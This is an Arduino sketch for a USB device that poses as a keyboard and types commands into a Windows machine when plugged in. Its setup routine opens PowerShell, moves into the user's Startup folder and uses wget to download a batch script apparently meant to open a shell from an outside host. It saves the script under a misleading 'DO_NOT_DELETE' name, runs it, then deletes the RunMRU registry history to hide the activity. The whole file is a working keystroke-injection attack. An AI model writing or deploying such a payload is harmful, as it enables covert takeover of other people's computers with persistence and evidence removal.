#include <Keyboard.h>

byte KEYPAD[10] = {234, 225, 226, 227, 228, 229, 230, 231, 232, 233};

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void NumChar(char *inStr) {
  
  for(byte i=0; i<strlen(inStr); i++){  
    byte hundreds = (byte)inStr[i] / 100;
    byte dozens = ((byte)inStr[i] - (hundreds*100)) / 10;
    byte singles = (byte)inStr[i] - (hundreds*100) - (dozens*10);
    
    Keyboard.press(KEY_LEFT_ALT);
    typeKey((int)KEYPAD[hundreds]);
    typeKey((int)KEYPAD[dozens]);
    typeKey((int)KEYPAD[singles]);
  }
  
  Keyboard.releaseAll();
}

void Print(String s, int d){

  Keyboard.print(s);
  typeKey(KEY_RETURN);
  Serial.print(s);
  delay(d);
  
}

void setup() {

  Keyboard.begin();

  delay(500);

  //Keyboard.releaseAll();

  //Keyboard.press(KEY_LEFT_GUI);
  //Keyboard.press('r');
  delay(50);
  
  //Keyboard.releaseAll();

  Print("powershell", 300);
  Print("cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'", 50);
  Print("wget http://website.net/scripts/ShellStartupWin10.bat -OutFile 'Win10Startup_DO_NOT_DELETE.bat'", 50);
  Print("start Win10Startup_DO_NOT_DELETE.bat", 50);
  Print("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f", 50);
  Print("exit", 1);

  

  Keyboard.end();

}

void loop() {

}
